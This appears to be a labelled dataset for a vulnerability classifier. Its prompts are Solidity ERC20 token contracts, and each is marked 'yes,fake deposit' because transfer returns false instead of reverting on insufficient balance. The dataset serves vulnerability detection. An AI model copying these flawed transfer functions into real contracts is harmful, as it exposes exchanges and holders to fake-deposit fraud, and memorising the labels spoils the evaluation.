{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'StirFriedShrimp' token contract\n//\n// Symbol : SFS \ud83e\udd90\n// Name : Stir Fried Shrimp\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract StirFriedShrimp is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Stir Fried Shrimp\";\n string public constant symbol = \"SFS \ud83e\udd90\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Boob Token\";\n decimals = 0;\n symbol = \"BOOB\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000; // Update total supply (100000 for example)\n name = \"2023 TOKEN\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals\n symbol = \"2023\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaBacon is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Bacon\";\n string public constant symbol = \"INU \ud83e\udd53\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 11451400; // Give the creator all initial tokens (100000 for example)\n totalSupply = 11451400; // Update total supply (100000 for example)\n name = \"INM COIN\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"INM\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// File: gganbu_token.sol\n\npragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000000000; // Update total supply (100000 for example)\n name = \"GGANBU Token\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"GGB\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract WhiteDoge is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'WOGE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function WhiteDoge() {\n balances[msg.sender] = 1000000000000000000000000000000; \n totalSupply = 1000000000000000000000000000000;\n name = \"White Doge\";\n decimals = 18; \n symbol = \"WOGE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"taco.finance\";\n decimals = 0;\n symbol = \"TACO\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract EthereumCyberPunks is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Cyber Punks\";\n string public constant symbol = \"EPUNK \ud83d\udc7b\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n\n function transfer(address to, uint value) public returns (bool ok);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract CryptopiaLandDollar is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 4000000*10**uint256(decimals);\n\n string public constant name = \"CryptopiaLandDollar\";\n string public constant symbol = \"CLD\";\n\n address payable teamAddress;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n\n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Verso is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000*10**uint256(decimals);\n string public constant name = \"Verso\";\n string public constant symbol = \"VSO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address 